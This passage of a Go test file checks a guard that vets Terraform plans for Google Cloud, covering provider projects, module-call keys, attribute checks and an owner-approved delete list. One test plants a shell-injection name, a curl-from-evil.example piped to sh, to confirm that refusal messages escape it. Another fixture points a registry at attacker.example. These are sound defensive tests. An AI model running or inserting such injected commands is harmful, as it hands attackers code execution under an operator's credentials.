	for _, block := range []string{"google", "module.m:google", "module.a.module.b:google", "module.d:google"} {
		if !refusedWith(out, "provider_config."+block+" (", "var.project", "not written out") {
			t.Errorf("gives %q, want %s refused for a project it does not write out", out, block)
		}
	}
	if len(out) != 4 {
		t.Errorf("gives %d refusals %q, want the four provider blocks alone", len(out), out)
	}
	if out := managedTestCover().NotCovered(readPlanFixture(t, "managed_provider_module_project_clean_plan.json"), nil); len(out) != 0 {
		t.Fatalf("the same plan with proj-1 written out in every provider block gives %q, want it covered", out)
	}
}

// moduleProjectPlan is a plan whose module m has its own provider block with
// the given project, and whose call passes the given arguments: the shape of
// testdata/managed_provider_module_project_plan.json.
func moduleProjectPlan(t *testing.T, project, callExpressions map[string]any) *Plan {
	t.Helper()
	module := map[string]any{"resources": []any{map[string]any{"address": "google_storage_bucket.b", "mode": "managed",
		"type": "google_storage_bucket", "name": "b", "provider_config_key": "module.m:google"}},
		"variables": map[string]any{"project": map[string]any{"default": "proj-1"}}}
	call := map[string]any{"source": "./m", "module": module}
	if callExpressions != nil {
		call["expressions"] = callExpressions
	}
	cfg := config(map[string]string{"google": googleProvider}, nil, map[string]any{"m": call})
	cfg["provider_config"].(map[string]any)["module.m:google"] = map[string]any{"name": "google", "full_name": googleProvider,
		"module_address": "module.m", "expressions": map[string]any{"project": project}}
	rc := bucketChange("module.m.google_storage_bucket.b", ManagedPrefix+"b", googleProvider)
	return jsonPlan(t, []map[string]any{rc}, cfg)
}

// TestManagedCoverModuleCallProjectFailsClosed: a module's provider block is
// admitted when it writes its project out, whatever its call passes, and
// refused when it reads it from a variable, whatever its call passes — proj-1
// written out in the call or as the variable's default included, which the
// previous rule admitted.
func TestManagedCoverModuleCallProjectFailsClosed(t *testing.T) {
	proj1 := map[string]any{"project": constant("proj-1")}
	for name, call := range map[string]map[string]any{
		"passing proj-1":  proj1,
		"passing nothing": nil,
	} {
		t.Run("admits a block that writes proj-1 out, its call "+name, func(t *testing.T) {
			if out := managedTestCover().NotCovered(moduleProjectPlan(t, constant("proj-1"), call), nil); len(out) != 0 {
				t.Fatalf("gives %q, want it covered", out)
			}
		})
	}
	for name, call := range map[string]map[string]any{
		"passing proj-1 written out":      proj1,
		"passing nothing over a default":  nil,
		"passing a root variable":         {"project": refs("var.project")},
		"passing a local":                 {"project": refs("local.p")},
		"passing proj-2 over the default": {"project": constant("proj-2")},
	} {
		t.Run("refuses a block reading var.project, its call "+name, func(t *testing.T) {
			out := managedTestCover().NotCovered(moduleProjectPlan(t, refs("var.project"), call), nil)
			if !refusedWith(out, "provider_config.module.m:google (", "var.project", "not written out") {
				t.Fatalf("gives %q, want the module's provider block refused", out)
			}
		})
	}
	if out := managedTestCover().NotCovered(moduleProjectPlan(t, constant("proj-2"), proj1), nil); !refusedWith(out, "provider_config.module.m:google (", "lands resources in project proj-2") {
		t.Fatalf("a module block writing proj-2 out gives %q, want it refused", out)
	}
}

// moduleCallPlan is moduleProjectPlan's shape with the call itself written by
// the caller: a covered plan (module.m's own provider block writes proj-1 out
// and its call passes proj-1) whose module call mut may change. It is the
// baseline the assertions below need — a refusal has to be the key's own, so
// the same plan without the key must be covered.
func moduleCallPlan(t *testing.T, mut func(call map[string]any)) *Plan {
	t.Helper()
	module := map[string]any{
		"resources": []any{map[string]any{"address": "google_storage_bucket.b", "mode": "managed",
			"type": "google_storage_bucket", "name": "b", "provider_config_key": "module.m:google"}},
		"variables": map[string]any{"project": map[string]any{"default": "proj-1"}},
	}
	call := map[string]any{"source": "./m", "expressions": map[string]any{"project": constant("proj-1")}, "module": module}
	if mut != nil {
		mut(call)
	}
	cfg := config(map[string]string{"google": googleProvider}, nil, map[string]any{"m": call})
	cfg["provider_config"].(map[string]any)["module.m:google"] = map[string]any{"name": "google", "full_name": googleProvider,
		"module_address": "module.m", "expressions": map[string]any{"project": constant("proj-1")}}
	rc := bucketChange("module.m.google_storage_bucket.b", ManagedPrefix+"b", googleProvider)
	return jsonPlan(t, []map[string]any{rc}, cfg)
}

// TestManagedCoverRefusesAModuleCallsOwnKeys: a module call is a place the
// cover reads, not one it passes through. The call's own keys are not the
// called module's resources, so nothing else in the walk sees them: its
// version constraint, and the meta-arguments its expressions carry — count and
// for_each, which decide how many instances the call makes, providers, which
// decides which provider configuration the called module's resources use, and
// depends_on, which decides what the apply waits for — are all refused rather
// than read as inert, the same direction the plan's and the configuration's
// own unknown keys take. The baseline is the same plan without them, so each
// refusal below is the key's and not the shape's.
func TestManagedCoverRefusesAModuleCallsOwnKeys(t *testing.T) {
	if out := managedTestCover().NotCovered(moduleCallPlan(t, nil), nil); len(out) != 0 {
		t.Fatalf("the baseline (a module call passing proj-1) gives %q, want it covered: the refusals below are then not the keys'", out)
	}
	for name, mut := range map[string]func(call map[string]any){
		"count":    func(c map[string]any) { c["expressions"].(map[string]any)["count"] = constant(2) },
		"for_each": func(c map[string]any) { c["expressions"].(map[string]any)["for_each"] = refs("var.projects") },
		"providers": func(c map[string]any) {
			c["expressions"].(map[string]any)["providers"] = map[string]any{"google": "google"}
		},
		"depends_on": func(c map[string]any) {
			c["expressions"].(map[string]any)["depends_on"] = []any{"google_storage_bucket.b"}
		},
		"version_constraint": func(c map[string]any) { c["version_constraint"] = "~> 1.0" },
	} {
		t.Run(name, func(t *testing.T) {
			out := managedTestCover().NotCovered(moduleCallPlan(t, mut), nil)
			if !refusedWith(out, "configuration.root_module.module_calls.m", name) {
				t.Errorf("a module call carrying %s gives %q, want it refused by that key", name, out)
			}
		})
	}
	// A call whose expressions the cover cannot read is refused too: not read
	// as carrying no meta-argument.
	out := managedTestCover().NotCovered(moduleCallPlan(t, func(c map[string]any) { c["expressions"] = "proj-1" }), nil)
	if !refusedWith(out, "configuration.root_module.module_calls.m.expressions (", "does not decode") {
		t.Errorf("a module call whose expressions do not decode gives %q, want it refused", out)
	}
	// And an empty one carries nothing: absent, null, [] and {} are what the
	// rest of the cover reads as nothing, and this is the same rule.
	for name, empty := range map[string]any{"an empty object": map[string]any{}, "null": nil} {
		out := managedTestCover().NotCovered(moduleCallPlan(t, func(c map[string]any) {
			if empty == nil {
				c["expressions"] = map[string]any{"project": constant("proj-1"), "for_each": nil}
				return
			}
			c["expressions"].(map[string]any)["for_each"] = empty
		}), nil)
		if len(out) != 0 {
			t.Errorf("a module call with %s for_each gives %q, want it covered: an empty meta-argument carries nothing", name, out)
		}
	}
}

// TestManagedCoverRefusesASecondProjectInTerraformsOwnPlan is the same rule on
// a plan nobody wrote by hand: terraform's own output for a root whose module
// provider block bills proj-2 and whose resource is in proj-2. The resource is
// refused by address, and the refusal is the project rule's.
func TestManagedCoverRefusesASecondProjectInTerraformsOwnPlan(t *testing.T) {
	const addr = "module.m.google_project_service.s"
	out := managedTestCover().NotCovered(readPlanFixture(t, "managed_provider_settings_plan.json"), nil)
	if !refusedWith(out, addr+" (", "in project proj-2, which is not this run's") {
		t.Fatalf("gives %q, want %s refused for the project it is in", out, addr)
	}
}

// TestManagedCoverDropsInitAttributeChecks is the other half of the decision:
// the attribute checks that only make sense for Fugaro's own embedded modules
// are dropped, and each fixture below passes because of it. init's cover
// refuses every one of them (cover_test.go, cover_golden_test.go); a managed
// plan's resources are the plan's own, and the rules that keep Fugaro's own
// resources out of reach are Task 1.1's — the name carries the prefix, the
// runs bucket is refused by name, and the accounts a job or a scheduler runs
// as must be the managed project's own. The sink's project is dropped with its
// type (TestManagedCoverRefusesTheDroppedTypes), and the bucket or repository
// a grant is on with the prefix rule, so neither has a fixture here.
//
// Each row asserts both halves, so that it isolates the check it is named for
// rather than the first one init's cover happens to reach: init's cover is
// asked the same plan and must refuse it for that check's own reason, and the
// managed cover must admit it. A row whose fixture init's cover refuses
// earlier — the image check before the command, the command before the check
// spec — proves nothing about the check it is named for, which is why every
// job below runs the image init's cover admits.
func TestManagedCoverDropsInitAttributeChecks(t *testing.T) {
	// job is the kept job fixture with the container replaced: its name and its
	// service account stay what Task 1.1 requires, so the type, the prefix and
	// the account rule all admit it and only a dropped attribute check could
	// refuse it.
	job := func(container map[string]any) ResourceChange {
		return mrc("google_cloud_run_v2_job", map[string]any{
			"name": ManagedPrefix + "job",
			"template": []any{map[string]any{"template": []any{map[string]any{
				"service_account": managedAccount,
				"containers":      []any{container},
			}}}},
		})
	}
	// registryImage is an image of this run's registry: init's image check
	// admits it (testCover's Ghcr is not a prefix of it, so no pin is read), so
	// a job running it reaches the checks after the image's own.
	const registryImage = "us-east5-docker.pkg.dev/proj-1/base/job:1"
	for name, tc := range map[string]struct {
		rc   ResourceChange
		want string // what init's cover refuses it for
	}{
		"an image outside this run's registry": {
			job(map[string]any{"image": "docker.io/library/alpine:3"}),
			"which is outside this run's registry"},
		"a container command the modules do not set": {
			job(map[string]any{"image": registryImage, "command": []any{"/bin/sh"}, "args": []any{"-c", "true"}}),
			"runs a command the modules do not set"},
		"a check spec pointing at another registry": {
			job(map[string]any{"image": registryImage, "command": []any{"fugaro"}, "args": []any{"image", "check", "--job"},
				"env": []any{map[string]any{"name": "FUGARO_CHECK_SPEC", "value": `{"registry":"attacker.example"}`}}}),
			"a check spec whose registry"},
		"a scheduler calling a job that is not this run's": {
			mrc("google_cloud_scheduler_job", map[string]any{
				"name": ManagedPrefix + "sweep",
				"http_target": []any{map[string]any{
					"uri":         "https://run.googleapis.com/v2/projects/other/locations/us-east5/jobs/fugaro-sweep:run",
					"oauth_token": []any{map[string]any{"service_account_email": managedAccount}}}}}),
			"not a job of this run's project and region"},
		"a bucket without public access prevention": {
			mrc("google_storage_bucket", map[string]any{
				"name": ManagedPrefix + "bucket", "public_access_prevention": "inherited", "uniform_bucket_level_access": false}),
			"without public access prevention"},
		"an API key whose targets are not the web key's": {
			mrc("google_apikeys_key", map[string]any{
				"name":         ManagedPrefix + "key",
				"restrictions": []any{map[string]any{"api_targets": []any{map[string]any{"service": "compute.googleapis.com"}}}}}),
			"whose API targets are not the web key's"},
	} {
		t.Run(name, func(t *testing.T) {
			if out := managedTestCover().NotCovered(managedPlan(tc.rc), nil); len(out) != 0 {
				t.Fatalf("%s gives %q, want it covered: the check is dropped for a managed plan", name, out)
			}
			if out := testCover.NotCovered(managedPlan(tc.rc), nil); !refusedWith(out, tc.want) {
				t.Fatalf("init's cover gives %q, want it refused for %q: the row would not isolate the check", out, tc.want)
			}
		})
	}
}

// The delete rule (design D72/D74): the managed cover takes the owner's delete
// list
// as an input beside the plan, and a delete or a replace is judged twice — the
// address must be on the list exactly, as tf.Guard compares it — and the
// resource must be one the managed allowlist admits, judged exactly as a
// create is. The address alone never admits one, and the list alone neither:
// the two are separate rules and a fixture fails each on its own.

// destroyed is the change terraform writes for a resource it destroys: the
// resource in before, null in after, and no after_unknown. It is what the
// removed half of a delete or a replace is read from.
//
// The view carries an id, because terraform's state does: every resource of
// Google's provider has one, and it is what the owner's delete list binds an
// approval to (Task 6.3). The fixtures above are written without one — no
// other rule reads it — so it is added here, on a copy, and never on the
// fixture's own map, which every test in this file shares.

// withInstance is rc with the per-instance attribute its type carries filled
// into its before view when the fixture did not write one
// (removalInstanceAttributes, read here as the rule reads it). A state
// terraform wrote always carries it — the provider computes it when the object
// is created — and a removal whose view lacks it identifies nothing and is
// refused (tf.Approves), so a fixture that meant "the plan removes this
// object" and left it out would be reading that refusal instead of the rule it
// is about. The value is the fixture's own and is derived from the address, so
// two fixtures of one type are two instances and one fixture is always the
// same instance. A type that carries none, and a change with no before view at
// all (a create), come back unchanged.
func withInstance(rc ResourceChange) ResourceChange {
	attr := removalInstanceAttributes[rc.Type]
	if attr == "" || rc.Change.Before == nil {
		return rc
	}
	if v, ok := rc.Change.Before[attr]; ok && v != nil {
		return rc
	}
	before := make(map[string]any, len(rc.Change.Before)+1)
	for k, v := range rc.Change.Before {
		before[k] = v
	}
	if attr == "generation" {
		// A bucket object's generation is a number in terraform's JSON
		// (tf.instanceValue), and a fixture that wrote a string there would
		// not be the shape the plan has.
		before[attr] = float64(1758000000000000)
	} else {
		before[attr] = "fixture-instance:" + rc.Address
	}
	rc.Change.Before = before
	return rc
}

func destroyed(rc ResourceChange) ResourceChange {
	before := make(map[string]any, len(rc.Change.After)+1)
	for k, v := range rc.Change.After {
		before[k] = v
	}
	rc.Change.Actions = []string{"delete"}
	rc.Change.Before = before
	if _, ok := before["id"]; !ok {
		before["id"] = "id:" + rc.Address
	}
	rc.Change.After = nil
	rc.Change.AfterUnknown = nil
	return withInstance(rc)
}

// approving is the owner's delete list holding the entry that approves rc's
// own removal — the address and the identity the plan shows there (ApprovalFor)
// — which is what an approval is since Task 6.3. A test that means "the owner
// approved this removal" writes this and not a bare address: the address alone
// approves nothing any more, and a test written with one would pass over a rule
// it no longer exercises.
func approving(rc ResourceChange) []DeleteEntry { return []DeleteEntry{ApprovalFor(withInstance(rc))} }

// TestManagedCoverAdmitsAListedDeleteOfAnAllowedResource: a delete of an exact
// address on the owner's list whose resource the allowlist admits is admitted.
// Every kept type, because every one of them is judged on the resource the
// plan removes and each has its own rule.
func TestManagedCoverAdmitsAListedDeleteOfAnAllowedResource(t *testing.T) {
	for _, typ := range ManagedAllowedTypes() {
		t.Run(typ, func(t *testing.T) {
			rc := destroyed(managedKeptFixture[typ])
			c := managedTestCover().WithDeleteEntries(approving(rc))
			if out := c.NotCovered(managedPlan(rc), nil); len(out) != 0 {
				t.Fatalf("a listed delete of the %s fixture is not covered: %q", typ, out)
			}
		})
	}
}

// TestManagedCoverRefusesAListedDeleteOfATypeOutsideTheAllowlist: the rule at
// the cover, where the resource is judged. The address alone is not the
// decision: a listed delete whose type the managed
// list does not carry is refused, and the refusal names the type rule rather
// than the actions, so a cover that admitted a listed delete unjudged would
// fail here. The first two are dropped entries and the third is a type neither
// list carries.
func TestManagedCoverRefusesAListedDeleteOfATypeOutsideTheAllowlist(t *testing.T) {
	for _, tc := range []struct{ typ, want string }{
		// A type allowedTypes carries and the managed list dropped: the
		// refusal names the decision that dropped it.
		{"google_project_iam_member", "allowlist leaves out"},
		{"google_monitoring_alert_policy", "allowlist leaves out"},
		// A type neither list carries.
		{"google_compute_instance", "a resource type outside the managed project's allowlist"},
	} {
		t.Run(tc.typ, func(t *testing.T) {
			rc := destroyed(mrc(tc.typ, map[string]any{"name": ManagedPrefix + "x"}))
			c := managedTestCover().WithDeleteEntries(approving(rc))
			out := c.NotCovered(managedPlan(rc), nil)
			if len(out) != 1 || !strings.HasPrefix(out[0], rc.Address+" (") {
				t.Fatalf("a listed delete of %s gives %q, want one refusal at its own address", tc.typ, out)
			}
			if !strings.Contains(out[0], tc.want) {
				t.Errorf("a listed delete of %s is refused for %q, want the type rule %q: the address alone is not the decision", tc.typ, out[0], tc.want)
			}
			if strings.Contains(out[0], "actions ") {
				t.Errorf("a listed delete of %s is refused for its actions (%q), want the resource judged", tc.typ, out[0])
			}
		})
	}
}

// TestManagedCoverRefusesAnActionSetTerraformDoesNotWrite: managedActions'
// sets are terraform's own, whole and in order, and a delete mixed with
// another action is not one of them. The listed address does not make it a
// replace: the set is refused for its actions rather than read as the delete
// it resembles, so a set no terraform writes never reaches the resource rules.
func TestManagedCoverRefusesAnActionSetTerraformDoesNotWrite(t *testing.T) {
	for _, acts := range [][]string{{"delete", "update"}, {"update", "delete"}, {"create", "delete", "update"}} {
		t.Run(strings.Join(acts, ","), func(t *testing.T) {
			rc := managedKeptFixture["google_storage_bucket"]
			rc.Change.Actions = acts
			c := managedTestCover().WithDeleteEntries(approving(rc))
			out := c.NotCovered(managedPlan(rc), nil)
			if len(out) != 1 || !strings.Contains(out[0], "actions "+strings.Join(acts, ", ")) {
				t.Fatalf("the action set %v of a listed address gives %q, want the actions rule", acts, out)
			}
		})
	}
}

// TestManagedCoverAdmitsTheActionsThatRemoveNothing: read and no-op change or
// read a resource without removing it, so neither asks for the owner's list and
// neither reads a resource rule. read is the one of the four with no other
// fixture in the tree — every read the real terraform outputs here is a data
// source, refused by managedMode before the actions are read — so a
// managed-mode read is pinned here for the action rule itself, beside the no-op
// the other fixtures reach.
func TestManagedCoverAdmitsTheActionsThatRemoveNothing(t *testing.T) {
	for _, acts := range [][]string{{"read"}, {"no-op"}} {
		t.Run(strings.Join(acts, ","), func(t *testing.T) {
			rc := managedKeptFixture["google_storage_bucket"]
			rc.Change.Actions = acts
			if out := managedTestCover().NotCovered(managedPlan(rc), nil); len(out) != 0 {
				t.Fatalf("a managed %s gives %q, want it covered: it removes nothing", strings.Join(acts, ", "), out)
			}
		})
	}
}

// TestManagedCoverJudgesTheRemovedViewFromBefore: the removed view is the
// resource the plan takes away, and nothing of the after is carried onto it —
// a destroy's after_unknown describes a resource that will not exist, and an
// import is about the resource a plan takes over rather than one it removes.
// The listed destroy below is admitted on before alone, which is what removed
// builds.
func TestManagedCoverJudgesTheRemovedViewFromBefore(t *testing.T) {
	rc := destroyed(managedKeptFixture["google_storage_bucket"])
	rc.Change.AfterUnknown = map[string]any{"name": true,
		"retention_policy": []any{map[string]any{"is_locked": true}}}
	rc.Change.Importing = &Importing{ID: "fugaro-tfstate-proj-1"}
	c := managedTestCover().WithDeleteEntries(approving(rc))
	if out := c.NotCovered(managedPlan(rc), nil); len(out) != 0 {
		t.Fatalf("a listed destroy of a prefixed bucket gives %q, want it covered: the removed view is before and nothing of the after", out)
	}
}

// TestManagedCoverRefusesAListedDeleteOutsideTheManagedPrefix: the same for the
// name rule — an allowed type whose removed resource is not the plan's own.
func TestManagedCoverRefusesAListedDeleteOutsideTheManagedPrefix(t *testing.T) {
	rc := destroyed(managedKeptFixture["google_storage_bucket"])
	rc.Change.Before = map[string]any{"name": "fugaro-runs-proj-1", "id": "fugaro-runs-proj-1"}
	out := managedTestCover().WithDeleteEntries(approving(rc)).NotCovered(managedPlan(rc), nil)
	if len(out) != 1 || !strings.Contains(out[0], "outside the managed prefix") {
		t.Fatalf("a listed delete of a bucket outside the prefix gives %q, want the prefix rule", out)
	}
	// The same resource with the name it may carry: the fixture above fails on
	// the name and on nothing else, and the entry is the owner's for the view
	// the plan then shows.
	rc.Change.Before = map[string]any{"name": ManagedPrefix + "bucket", "id": "fmgd-bucket"}
	if out := managedTestCover().WithDeleteEntries(approving(rc)).NotCovered(managedPlan(rc), nil); len(out) != 0 {
		t.Fatalf("the same delete with a prefixed name gives %q, want it covered", out)
	}
}

// TestManagedCoverRefusesAListedDeleteOfAnAccountOutsideTheManagedProject: the
// account rules are the resource judgement too — a listed delete of a grant on
// the project's default compute account is refused.
func TestManagedCoverRefusesAListedDeleteOfAnAccountOutsideTheManagedProject(t *testing.T) {
	rc := destroyed(managedKeptFixture["google_service_account_iam_member"])
	rc.Change.Before = map[string]any{
		"id":                 "projects/proj-1/serviceAccounts/123456789-compute@developer.gserviceaccount.com/roles/iam.serviceAccountUser",
		"service_account_id": "projects/proj-1/serviceAccounts/123456789-compute@developer.gserviceaccount.com",
		"member":             "serviceAccount:" + managedAccount, "role": "roles/iam.serviceAccountUser"}
	c := managedTestCover().WithDeleteEntries(approving(rc))
	out := c.NotCovered(managedPlan(rc), nil)
	if len(out) != 1 || !strings.Contains(out[0], "not a service account of the managed project") {
		t.Fatalf("a listed delete of a grant on the default compute account gives %q, want the account rule", out)
	}
}

// TestManagedCoverRefusesAListedDeleteOfALockedResource: the whole chain is
// read on the removed view, the two lock rules included, so a resource whose
// own state carries a locked retention is refused however its address is
// listed — a decision NotCovered states, and the fail-closed direction: the
// lock is not the plan's, and reading a shorter chain for a delete would be a
// rule loosened rather than one read.
func TestManagedCoverRefusesAListedDeleteOfALockedResource(t *testing.T) {
	b := destroyed(managedKeptFixture["google_storage_bucket"])
	b.Change.Before = map[string]any{"name": ManagedPrefix + "bucket",
		"retention_policy": []any{map[string]any{"is_locked": true, "retention_period": "604800s"}}}
	o := destroyed(managedKeptFixture["google_storage_bucket_object"])
	o.Change.Before = map[string]any{"bucket": ManagedPrefix + "bucket", "name": "results.json",
		"retention": []any{map[string]any{"mode": "Locked", "retain_until_time": "2030-01-01T00:00:00Z"}}}
	for _, tc := range []struct {
		rc   ResourceChange
		want string // managedBucketLock's own words, and managedObjectLock's
	}{
		{b, "a bucket whose retention policy is locked"},
		{o, "an object whose retention mode is Locked"},
	} {
		c := managedTestCover().WithDeleteEntries(approving(tc.rc))
		out := c.NotCovered(managedPlan(tc.rc), nil)
		if len(out) != 1 || !strings.Contains(out[0], tc.want) {
			t.Fatalf("a listed delete of a locked %s gives %q, want %q", tc.rc.Type, out, tc.want)
		}
	}
}

// TestManagedCoverRefusalOfAShellCommandNameIsPasteable: the refusal an
// unlisted removal draws prints the identity of the object the plan removes,
// for its reader to copy into fugaro allow-delete — and the object's own name
// is the plan's, not this program's. The name rule (managedName) does not
// reach this one: for a bucket object the attribute managedNames names is the
// BUCKET, so the object's own name is read out of the before view as it
// stands. A plan carrying "fmgd-x;curl${IFS}evil.example|sh" there is a plan
// whose refusal would otherwise hand its reader a command line to paste, with
// the operator's credentials, so this pins the end the identity's escaping is
// for: the sentence holds no byte a shell reads (tf.identityValue,
// TestAnIdentityHoldsNoByteAShellWouldRead for the encoder itself).
func TestManagedCoverRefusalOfAShellCommandNameIsPasteable(t *testing.T) {
	rc := destroyed(managedKeptFixture["google_storage_bucket_object"])
	rc.Change.Before = map[string]any{
		"bucket": ManagedPrefix + "bucket", "name": `fmgd-x;curl${IFS}evil.example|sh`,
		"id": ManagedPrefix + "bucket/x", "project": "proj-1", "generation": float64(1758000000000000)}
	out := managedTestCover().NotCovered(managedPlan(rc), nil)
	if len(out) != 1 {
		t.Fatalf("an unlisted delete of a bucket object gives %q, want one refusal", out)
	}
	// The identity the sentence prints, copied the way its reader copies it:
	// what follows the sentence's own words, up to the bracket that closes its
	// parenthetical. The sentence's own text is not part of it — it is this
	// program's, and it holds an apostrophe of its own.
	const mark = "(the plan removes "
	i := strings.Index(out[0], mark)
	if i < 0 {
		t.Fatalf("the refusal does not name the object the plan removes:\n%s", out[0])
	}
	printed := strings.TrimSuffix(out[0][i+len(mark):], ")")
	if strings.ContainsAny(printed, ";|&$`{}[]*?!~'\"") {
		t.Errorf("the refusal prints the plan's own name raw, so a reader pasting it runs a command:\n%s", printed)
	}
	if !strings.Contains(printed, `fmgd-x\x3bcurl\x24\x7bIFS\x7devil.example\x7csh`) {
		t.Errorf("the refusal does not carry the name as the identity escapes it:\n%s", printed)
	}
}

// TestManagedCoverReplacesAreJudgedLikeDeletes: both of terraform's action
// orders, and both halves — the resource the plan removes and the one it
// creates. A replace of a listed address is refused when either half is not
// one a managed plan may contain, and an unlisted one is refused whatever the
// resources are.
func TestManagedCoverReplacesAreJudgedLikeDeletes(t *testing.T) {
	for _, order := range [][]string{{"delete", "create"}, {"create", "delete"}} {
		t.Run(strings.Join(order, ","), func(t *testing.T) {
			replacing := func(before, after map[string]any) ResourceChange {
				rc := managedKeptFixture["google_storage_bucket"]
				rc.Change.Actions = order
				rc.Change.Before, rc.Change.After = before, after
				return rc
			}
			prefixed, fugaro := map[string]any{"name": ManagedPrefix + "bucket"}, map[string]any{"name": "fugaro-tfstate-proj-1"}
			// The owner's entry is for the object the change removes, which is
			// the one in before (Task 6.3): each case below is handed the entry
			// for its own removal, so what refuses it is the resource rule the
			// case is about and never the list.
			listed := func(rc ResourceChange) Deletable {
				return managedTestCover().WithDeleteEntries(approving(rc))
			}
			if out := listed(replacing(prefixed, prefixed)).NotCovered(managedPlan(replacing(prefixed, prefixed)), nil); len(out) != 0 {
				t.Fatalf("a listed replace of two allowed resources gives %q, want it covered", out)
			}
			if out := listed(replacing(fugaro, prefixed)).NotCovered(managedPlan(replacing(fugaro, prefixed)), nil); len(out) != 1 || !strings.Contains(out[0], "outside the managed prefix") {
				t.Fatalf("a listed replace whose removed resource is not the plan's gives %q, want the prefix rule", out)
			}
			if out := listed(replacing(prefixed, fugaro)).NotCovered(managedPlan(replacing(prefixed, fugaro)), nil); len(out) != 1 || !strings.Contains(out[0], "outside the managed prefix") {
				t.Fatalf("a listed replace whose created resource is not the plan's gives %q, want the prefix rule", out)
			}
			// The unlisted replace, whose resources are both the plan's own:
			// the list is the whole of the refusal, and the resource rules
			// have nothing to say about it. The refusal prints the identity of
			// the object the plan removes beside the address, because that is
			// what an entry of the owner's list has to name and the address
			// alone stopped being an entry (Task 6.3): an owner sent to record
			// the address would write a list that approves nothing. The
			// identity is read back from RemoveIdentityText, the rule's own
			// answer, rather than spelled out here.
			unlisted := managedPlan(replacing(prefixed, prefixed))
			out := managedTestCover().NotCovered(unlisted, nil)
			if len(out) != 1 || !strings.Contains(out[0], "not on the owner's delete list") {
				t.Fatalf("an unlisted replace of two allowed resources gives %q, want the delete-list rule", out)
			}
			if id := RemoveIdentityText(unlisted.ResourceChanges[0]); !strings.Contains(out[0], id) {
				t.Errorf("the refusal is %q, want the identity the owner's entry must carry named in it (%s)", out[0], id)
			}
		})
	}
}

// TestManagedCoverBindsAListedAddressToTheObjectItApproved: the entry of the
// owner's list carries the identity of the object that was at the address when
// the owner approved it (Task 6.3), and the cover admits a removal only when
// the plan removes that object. A second delete at the same address — the
// object re-created, so another id — is refused, which is the reuse the
// address-only list allowed: the entry stands for one object, and the approval
// it carries is spent when that object is gone.
func TestManagedCoverBindsAListedAddressToTheObjectItApproved(t *testing.T) {
	approved := destroyed(managedKeptFixture["google_storage_bucket"])
	recreated := approved
	recreated.Change.Before = map[string]any{"name": ManagedPrefix + "bucket", "id": "fmgd-bucket-2"}

	if out := managedTestCover().WithDeleteEntries(approving(approved)).NotCovered(managedPlan(approved), nil); len(out) != 0 {
		t.Fatalf("a delete of the object the entry names gives %q, want it covered", out)
	}
	out := managedTestCover().WithDeleteEntries(approving(approved)).NotCovered(managedPlan(recreated), nil)
	if len(out) != 1 || !strings.Contains(out[0], "for another object") {
		t.Fatalf("a listed address carrying another object gives %q, want it refused for the object", out)
	}
	if !strings.Contains(out[0], "fmgd-bucket-2") {
		t.Errorf("the refusal is %q, want the object the plan removes named in it: it is what the owner re-approves", out[0])
	}
	// And the entry for the object the plan removes admits it: the rule
	// refuses the reuse and not the delete.
	if out := managedTestCover().WithDeleteEntries(approving(recreated)).NotCovered(managedPlan(recreated), nil); len(out) != 0 {
		t.Fatalf("an entry bound to the object the plan removes gives %q, want it covered", out)
	}
	// A plan whose before view identifies nothing is refused whatever the list
	// holds: there is nothing to match an entry against.
	anonymous := approved
	anonymous.Change.Before = map[string]any{"location": "us-east5"}
	c := managedTestCover().WithDeleteEntries([]DeleteEntry{{Address: anonymous.Address, Before: "type=google_storage_bucket"}})
	if out := c.NotCovered(managedPlan(anonymous), nil); len(out) != 1 || !strings.Contains(out[0], "does not identify") {
		t.Fatalf("a removal the plan does not identify gives %q, want it refused for the missing identity", out)
	}
}

// TestManagedCoverDeleteListIsExactAddresses: the list is compared as tf.Guard
// compares it, by string equality. A listed x[0] admits nothing of x[1], and no
// module, prefix or glob shortcut stands in for an address.
func TestManagedCoverDeleteListIsExactAddresses(t *testing.T) {
	rc := destroyed(managedKeptFixture["google_storage_bucket"])
	rc.Address = "module.managed.google_storage_bucket.x[1]"
	// The entry's identity is the one the plan shows, so nothing below is
	// refused for the identity: what each of these is about is the address.
	entry := ApprovalFor(rc)
	for _, listed := range []string{
		"module.managed.google_storage_bucket.x[0]",
		"module.managed.google_storage_bucket",
		"module.managed.google_storage_bucket.x*",
		"module.managed.google_storage_bucket.x",
	} {
		near := entry
		near.Address = listed
		if out := managedTestCover().WithDeleteEntries([]DeleteEntry{near}).NotCovered(managedPlan(rc), nil); len(out) != 1 {
			t.Errorf("%q listed admits x[1] (%q), want a refusal: an address matches by string equality alone", listed, out)
		}
	}
	if out := managedTestCover().WithDeleteEntries(approving(rc)).NotCovered(managedPlan(rc), nil); len(out) != 0 {
		t.Fatalf("the exact address listed gives %q, want it covered: the fixture above fails on the address alone", out)
	}
}

// TestManagedCoverDeleteListEmptyAdmitsNoDelete: absent and empty are the same
// thing, and both refuse every delete and every replace however allowed the
// resource is.
func TestManagedCoverDeleteListEmptyAdmitsNoDelete(t *testing.T) {
	rc := destroyed(managedKeptFixture["google_storage_bucket"])
	for _, allow := range [][]DeleteEntry{nil, {}} {
		if out := managedTestCover().WithDeleteEntries(allow).NotCovered(managedPlan(rc), nil); len(out) != 1 {
			t.Errorf("a delete with the list %v gives %q, want one refusal", allow, out)
		}
	}
}

// TestManagedCoverDeleteListIsCopied: the cover holds its own copy of the
// owner's list, so the list the guard is handed and the list the cover reads
// cannot drift apart through either of them.
func TestManagedCoverDeleteListIsCopied(t *testing.T) {
	rc := destroyed(managedKeptFixture["google_storage_bucket"])
	allow := approving(rc)
	c := managedTestCover().WithDeleteEntries(allow)
	allow[0] = ApprovalFor(destroyed(managedKeptFixture["google_apikeys_key"]))
	if out := c.NotCovered(managedPlan(rc), nil); len(out) != 0 {
		t.Fatalf("a delete of the address the cover was handed gives %q, want it covered: the list was not copied", out)
	}
}

// TestManagedCoverIsDeletable: the managed cover is the cover a managed apply
// hands the delete list to, and a value is what it returns — the interface the
// gate type-asserts for (internal/managed/plan.go).
func TestManagedCoverIsDeletable(t *testing.T) {
	var _ Deletable = ManagedCover{}
	var _ Deletable = managedTestCover()
	entries := []DeleteEntry{{Address: "x", Before: "type=t id=i"}}
	d := managedTestCover().WithDeleteEntries(entries)
	if !slices.Equal(d.(ManagedCover).AllowDelete, entries) {
		t.Error("WithDeleteEntries did not hand the cover the list it was given")
	}
	if !slices.Equal(d.(ManagedCover).Projects, managedTestCover().Projects) {
		t.Error("WithDeleteEntries changed the cover's own inputs: it is the cover with a list added, and nothing else")
	}
}

// TestManagedCoverRefusesAMovedDeleteUnderAListedAddress: the delete list
// names addresses, and a moved block puts another address's object under a
// listed one. The plan terraform writes for `moved { from = A, to = B }` with
